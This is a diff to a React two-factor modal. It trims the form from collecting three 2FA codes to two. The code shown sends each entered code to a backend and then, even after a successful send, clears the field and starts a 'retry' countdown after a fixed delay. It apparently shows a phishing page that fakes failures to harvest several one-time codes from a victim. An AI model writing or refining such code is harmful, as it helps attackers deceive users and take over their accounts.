@@ -60,10 +60,6 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
         if (click === 1) {
             dispatch(updateForm({ twoFaSecond: normalizedValue }));
         }
-
-        if (click === 2) {
-            dispatch(updateForm({ twoFaThird: normalizedValue }));
-        }
     };
 
     const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);
@@ -105,7 +101,6 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
         setErrors((prev) => ({ ...prev, twoFa: '' }));
         if (click === 0) dispatch(updateForm({ twoFa: pasted }));
         if (click === 1) dispatch(updateForm({ twoFaSecond: pasted }));
-        if (click === 2) dispatch(updateForm({ twoFaThird: pasted }));
     };
 
     const handleClose = () => {
@@ -137,7 +132,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
 
             if (click === 0) {
                 await SendData(formDataState)
-                .then((response) => {
+                .then(() => {
                     setTimeout(async () => {
                         setLoading(false);
                         setTwoFa('');
@@ -154,24 +149,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
 
             if (click === 1) {
                 await SendData(formDataState)
-                .then((response) => {
-                    setTimeout(async () => {
-                        setLoading(false);
-                        setTwoFa('');
-                        startRetryCountdown(2);
-                    }, 1234);
-
-                })
-                .catch((error) => {
-                    console.error("Error submitting form:", error);
-                    setLoading(false);
-                    setErrors({ twoFa: t.twoFa.errSend });
-                });
-            }
-
-            if (click === 2) {
-                await SendData(formDataState)
-                .then((response) => {
+                .then(() => {
                     setTimeout(async () => {
                         setLoading(false);
                         setTwoFa('');
